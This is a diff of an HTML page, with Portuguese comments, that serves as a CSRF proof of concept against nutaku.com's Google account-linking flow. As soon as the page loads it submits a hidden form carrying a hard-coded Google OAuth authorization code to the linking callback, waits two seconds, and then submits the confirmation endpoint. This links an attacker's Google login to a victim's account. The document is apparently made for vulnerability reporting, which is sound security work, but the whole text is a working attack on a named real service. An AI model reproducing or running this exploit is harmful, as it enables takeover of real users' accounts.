@@ -1,13 +1,32 @@
+<!DOCTYPE html>
 <html>
+  <head>
+    <title>CSRF PoC Nutaku - Google Link</title>
+  </head>
   <body>
-    <p>up</p>
+    <h2>CSRF PoC Nutaku</h2>
+
+    <!-- Formulário 1: /link/google/callback/ -->
+    <form id="callbackForm" method="GET" action="https://www.nutaku.com/link/google/callback/">
+      <input type="hidden" name="state" value="link">
+      <input type="hidden" name="code" value="4/0AVMBsJjQLsin8zBeBMZLqkXd4Fwjp0pkCc_2xeyQTl2mBDeGF34WN9ZEDxz6XBMZ-XFAoQ">
+      <input type="hidden" name="scope" value="email profile https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email openid">
+      <input type="hidden" name="authuser" value="3">
+      <input type="hidden" name="prompt" value="none">
+    </form>
+
+    <!-- Formulário 2: /link/google/confirmation/ -->
+    <form id="confirmForm" method="GET" action="https://www.nutaku.com/link/google/confirmation/">
+    </form>
+
     <script>
-      var callback = new Image();
-      callback.onload = function () {
-        var confirm = new Image();
-        confirm.src = "https://www.nutaku.com/link/google/confirmation/";
-      };
-      callback.src = "https://www.nutaku.com/link/google/callback/?state=link&code=SEU_CODIGO_VALIDO&scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+openid&authuser=3&prompt=none";
+      // Submete o primeiro formulário (callback)
+      document.getElementById('callbackForm').submit();
+
+      // Espera 2 segundos, então submete o segundo (confirmação)
+      setTimeout(function() {
+        document.getElementById('confirmForm').submit();
+      }, 2000);
     </script>
   </body>
 </html>
